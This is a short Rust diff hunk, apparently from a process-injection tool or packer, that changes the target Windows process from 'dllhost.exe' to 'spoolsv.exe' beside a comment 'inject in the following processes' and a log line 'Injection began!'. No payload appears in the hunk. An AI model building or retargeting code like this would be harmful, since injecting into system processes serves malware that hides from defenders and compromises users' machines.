@@ -118,7 +118,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
 
 fn main() {
     // inject in the following processes:
-    let tar: &str = "dllhost.exe";
+    let tar: &str = "spoolsv.exe";
     let file_path = "packer-log.txt";
 
     if let Err(error) = append_to_file(file_path, b"Injection began!") {
